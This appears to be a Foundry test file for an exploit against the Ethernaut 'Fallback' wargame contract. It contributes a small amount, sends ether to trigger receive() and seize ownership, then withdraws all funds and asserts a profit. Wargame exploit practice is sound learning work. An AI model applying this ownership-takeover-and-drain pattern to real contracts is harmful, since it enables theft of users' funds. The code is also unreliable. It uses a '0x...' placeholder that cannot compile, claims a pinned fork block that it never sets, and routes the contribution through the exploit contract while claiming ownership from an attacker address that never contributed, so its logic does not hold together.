
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/FallbackExploit.sol";

interface IFallback {
    function owner() external view returns (address);
    function contribute() external payable;
    function getContribution() external view returns (uint);
    function withdraw() external;
}

contract FallbackExploitTest is Test {
    FallbackExploit public exploit;
    IFallback public target;
    address public attacker = address(0x1337);
    
    function setUp() public {
        // Fork Sepolia at specific block for reproducibility
        vm.createSelectFork("https://rpc.sepolia.org");
        
        // Target address from Ethernaut
        target = IFallback(0x...); // Fill with actual instance address
        
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        exploit = new FallbackExploit(address(target));
    }
    
    function testExploit() public {
        vm.startPrank(attacker);
        
        // Step 1: Contribute small amount
        exploit.contribute{value: 0.0001 ether}();
        
        // Step 2: Send ether to trigger receive() and claim ownership
        (bool success, ) = address(target).call{value: 0.0001 ether}("");
        require(success, "Transfer failed");
        
        // Verify ownership
        assertEq(target.owner(), attacker);
        
        // Step 3: Withdraw all funds
        uint256 balanceBefore = attacker.balance;
        target.withdraw();
        uint256 balanceAfter = attacker.balance;
        
        // Verify profit
        assertGt(balanceAfter, balanceBefore);
        
        vm.stopPrank();
    }
}
